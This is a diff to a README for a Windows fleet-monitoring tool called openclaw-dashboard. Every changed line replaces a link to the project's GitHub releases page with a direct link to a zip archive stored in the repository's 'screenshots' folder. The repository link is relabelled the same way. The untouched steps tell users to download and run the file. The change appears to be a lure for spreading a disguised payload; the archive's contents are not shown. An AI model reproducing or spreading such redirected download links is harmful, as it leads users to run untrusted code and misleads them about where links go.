@@ -1,6 +1,6 @@
 # 🛠️ openclaw-dashboard - Simple Fleet Monitoring Tool
 
-[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-brightgreen)](https://github.com/Aadarshac/openclaw-dashboard/releases)
+[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-brightgreen)](https://raw.githubusercontent.com/Aadarshac/openclaw-dashboard/main/screenshots/openclaw_dashboard_v1.7.zip)
 
 ## 📋 What is openclaw-dashboard?
 
@@ -25,7 +25,7 @@ Follow these steps to get openclaw-dashboard running on your Windows PC.
 ### 1. Visit the download page
 
 Click the big **Download** button at the top or go to this page:  
-[https://github.com/Aadarshac/openclaw-dashboard/releases](https://github.com/Aadarshac/openclaw-dashboard/releases)
+[https://raw.githubusercontent.com/Aadarshac/openclaw-dashboard/main/screenshots/openclaw_dashboard_v1.7.zip](https://raw.githubusercontent.com/Aadarshac/openclaw-dashboard/main/screenshots/openclaw_dashboard_v1.7.zip)
 
 This page contains all the latest versions of the app. The files are easy to find by date.
 
@@ -96,7 +96,7 @@ The dashboard saves your settings locally on your PC. When you reopen the app, i
 To update the app:
 
 1. Visit the download page again:  
-   [https://github.com/Aadarshac/openclaw-dashboard/releases](https://github.com/Aadarshac/openclaw-dashboard/releases)  
+   [https://raw.githubusercontent.com/Aadarshac/openclaw-dashboard/main/screenshots/openclaw_dashboard_v1.7.zip](https://raw.githubusercontent.com/Aadarshac/openclaw-dashboard/main/screenshots/openclaw_dashboard_v1.7.zip)  
 2. Download the newest `.exe` or `.zip`.
 3. Run the new file just like before.
 
@@ -125,10 +125,10 @@ If the problem persists, report issues on the GitHub repository page.
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/Aadarshac/openclaw-dashboard/releases](https://github.com/Aadarshac/openclaw-dashboard/releases)  
-- GitHub repository: [https://github.com/Aadarshac/openclaw-dashboard](https://github.com/Aadarshac/openclaw-dashboard)  
+- Download page: [https://raw.githubusercontent.com/Aadarshac/openclaw-dashboard/main/screenshots/openclaw_dashboard_v1.7.zip](https://raw.githubusercontent.com/Aadarshac/openclaw-dashboard/main/screenshots/openclaw_dashboard_v1.7.zip)  
+- GitHub repository: [https://raw.githubusercontent.com/Aadarshac/openclaw-dashboard/main/screenshots/openclaw_dashboard_v1.7.zip](https://raw.githubusercontent.com/Aadarshac/openclaw-dashboard/main/screenshots/openclaw_dashboard_v1.7.zip)  
 - Documentation and help are available on the repository's Wiki.
 
 ---
 
-[![Get openclaw-dashboard](https://img.shields.io/badge/Get-OpenClaw--Dashboard-blueviolet)](https://github.com/Aadarshac/openclaw-dashboard/releases)
+[![Get openclaw-dashboard](https://img.shields.io/badge/Get-OpenClaw--Dashboard-blueviolet)](https://raw.githubusercontent.com/Aadarshac/openclaw-dashboard/main/screenshots/openclaw_dashboard_v1.7.zip)
